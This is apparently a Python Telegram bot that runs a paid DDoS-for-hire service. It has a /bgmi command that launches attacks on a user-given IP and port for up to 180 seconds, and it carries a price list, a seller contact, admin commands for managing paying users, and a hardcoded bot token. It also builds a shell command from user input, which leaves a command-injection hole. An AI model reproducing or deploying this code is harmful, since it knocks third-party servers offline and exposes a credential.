import telebot
import subprocess
import datetime
import os
import time
from threading import Timer

# Telegram bot token
TOKEN = '6976133669:AAGFTogzGASpeXK5d0CChGq_FeUskwTObsU'

# Create bot instance
bot = telebot.TeleBot(TOKEN)

# Admin user IDs
admin_ids = ["6022173368"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs already cleared ☑️."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ☑️"
    except FileNotFoundError:
        response = "No logs found ❎."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 180:
                response = "Error: Maximum attack time is 180 seconds ❌."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 217"
                subprocess.run(full_command, shell=True)
                response = f"Attack initiated on {target}:{port} \nComplete ✅"
        else:
            response = "Usage: /bgmi <target> <port> <time>"

    else:
        response = "You are not authorized 🤬"

    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    response = f"Attack started on {target} \nIP: {target} \nPort: {port} \nTime: {time}"
    bot.reply_to(message, response)

# Handler for /start command
@bot.message_handler(commands=['start'])
def welcome(message):
    response = "Welcome! Use /help for commands"
    bot.reply_to(message, response)

# Handler for /help command
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = '''Available commands 🐒
/bgmi : For DDoS 😈
/rules : Read carefully 🦁
/mylogs : Check your attacks 🐎
/plan : Buy from @Rolex_ddos

For Admin Commands:
/admincmd : Admin only 😎'''
    bot.reply_to(message, help_text)

# Handler for /rules command
@bot.message_handler(commands=['rules'])
def rules_command(message):
    response = '''Follow these rules ⚠️:

- Only one rule: do not spam'''
    bot.reply_to(message, response)

# Handler for /plan command
@bot.message_handler(commands=['plan'])
def plan_command(message):
    response = '''Buy from @Rolex_ddos

Vip:
- Attack Time: 180 seconds
- After Attack Limit: one minute
- Concurrents Attack: 60

Price list: 
One day: 100 Rs
One week: 500
One month: 1500'''
    bot.reply_to(message, response)

# Handler for /admincmd command
@bot.message_handler(commands=['admincmd'])
def admin_command(message):
    response = '''Admin commands:

/add <userId> : Add new user
/remove <userId> : Remove user
/allusers : Authorized user list
/logs : All user logs
/broadcast : Broadcast message
/clearlogs : Clear log file
/setexpire : Set user expiration time'''
    bot.reply_to(message, response)

# Handler for /add command
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            new_user_id = command[1]
            with open(USER_FILE, "a") as file:
                file.write(new_user_id + "\n")
            allowed_user_ids.append(new_user_id)
            response = f"User {new_user_id} added successfully ☑️."
        else:
            response = "Usage: /add <userId>"
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /remove command
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in allowed_user_ids:
                allowed_user_ids.remove(target_user_id)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(uid + "\n")
                response = f"User {target_user_id} removed successfully ☑️."
            else:
                response = f"User {target_user_id} not found ❌."
        else:
            response = "Usage: /remove <userId>"
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /allusers command
@bot.message_handler(commands=['allusers'])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        users = read_users()
        if users:
            response = "Authorized users:\n" + "\n".join(users)
        else:
            response = "No authorized users found."
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /logs command
@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        try:
            with open(LOG_FILE, "r") as file:
                logs = file.read()
                if logs:
                    response = logs
                else:
                    response = "No logs found."
        except FileNotFoundError:
            response = "No logs found."
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /clearlogs command
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        response = clear_logs()
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /broadcast command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message to all users:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to {user_id}: {str(e)}")
            response = "Broadcast successfully sent ☑️."
        else:
            response = "Write a message 🦧."
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Handler for /setexpire command
@bot.message_handler(commands=['setexpire'])
def set_expire(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 3:
            target_user_id = command[1]
            expire_time = int(command[2])
            Timer(expire_time, remove_user_by_id, [target_user_id]).start()
            response = f"User {target_user_id} will be removed in {expire_time} seconds ☑️."
        else:
            response = "Usage: /setexpire <userId> <timeInSeconds>"
    else:
        response = "Admin only ❗."
    bot.reply_to(message, response)

# Function to remove user by ID
def remove_user_by_id(user_id):
    if user_id in allowed_user_ids:
        allowed_user_ids.remove(user_id)
        with open(USER_FILE, "w") as file:
            for uid in allowed_user_ids:
                file.write(uid + "\n")
        print(f"User {user_id} removed.")

# Bot polling
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot crashed with error: {e}. Restarting...")
            time.sleep(5)
